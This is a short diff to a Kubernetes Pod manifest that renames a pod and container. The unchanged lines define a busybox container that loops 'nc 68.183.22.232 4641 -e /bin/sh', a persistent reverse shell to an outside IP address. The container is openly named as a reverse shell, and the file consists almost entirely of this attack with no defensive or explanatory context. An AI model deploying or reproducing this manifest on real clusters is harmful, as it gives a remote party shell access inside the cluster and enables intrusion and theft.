@@ -1,12 +1,12 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: Cye-RS-pod
+  name: cyerspod
   labels:
     app: nc
 spec:
   containers:
-  - name: Cye-reverse-shell
+  - name: cyereverseshell
     image: busybox
     args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
     securityContext:
